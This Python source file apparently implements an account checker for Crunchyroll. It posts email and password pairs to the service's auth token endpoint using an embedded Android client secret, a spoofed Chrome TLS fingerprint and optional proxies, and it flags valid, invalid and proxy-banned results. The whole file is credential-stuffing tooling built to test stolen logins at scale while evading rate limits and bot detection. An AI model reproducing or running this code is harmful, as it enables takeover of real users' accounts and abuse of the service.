import tls_client
import uuid

ANDROID_BASIC_TOKEN = "dWtveTJxY2VzcmRvaHBlc3F1YnI6XzFLRDFxMGZDT1pYTlJMcFRUaU9KMTBBSkhkWFV1d2c="

class CrunchyChecker:
    def __init__(self, proxy=None):
        self.session = tls_client.Session(
            client_identifier="chrome_120",
            random_tls_extension_order=True
        )
        if proxy:
            # Format attendu : ip:port ou user:pass@ip:port
            self.session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        
        self.device_id = str(uuid.uuid4())

    def get_token(self, email, password):
        url = "https://beta-api.crunchyroll.com/auth/v1/token"
        headers = {
            "Authorization": f"Basic {ANDROID_BASIC_TOKEN}",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Crunchyroll/3.79.0 Android/12 okhttp/4.12.0",
            "Etp-Anonymous-Id": str(uuid.uuid4())
        }
        data = {
            "grant_type": "password",
            "scope": "offline_access",
            "username": email,
            "password": password,
            "device_id": self.device_id,
            "device_name": "Railway-Checker",
            "device_type": "service"
        }

        try:
            response = self.session.post(url, data=data, headers=headers, timeout_seconds=10)
            if response.status_code == 403 or response.status_code == 1015:
                return "BANNED_PROXY", None
            if response.status_code == 401:
                return "INVALID", None
            if response.status_code == 200:
                return "SUCCESS", response.json().get("access_token")
            return "ERROR", None
        except:
            return "TIMEOUT", None
